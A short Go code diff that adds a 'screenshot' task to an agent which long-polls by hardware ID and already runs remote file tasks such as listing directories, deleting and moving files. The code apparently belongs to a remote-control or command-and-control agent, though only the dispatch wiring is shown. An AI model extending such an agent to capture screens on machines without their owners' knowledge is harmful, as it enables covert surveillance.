@@ -41,6 +41,7 @@ func longPoll(hwid string) {
 		"dircontents",
 		"deletefile",
 		"movefile",
+		"screenshot",
 	}
 	client.UseAccount(hwid)
 	for {
@@ -77,6 +78,8 @@ func executeTask(client *agent.Client, taskID int, type_ string, body map[string
 		deleteFileTask(client, taskID, body)
 	case "movefile":
 		moveFileTask(client, taskID, body)
+	case "screenshot":
+		screenshotTask(client, taskID, body)
 	}
 }
 
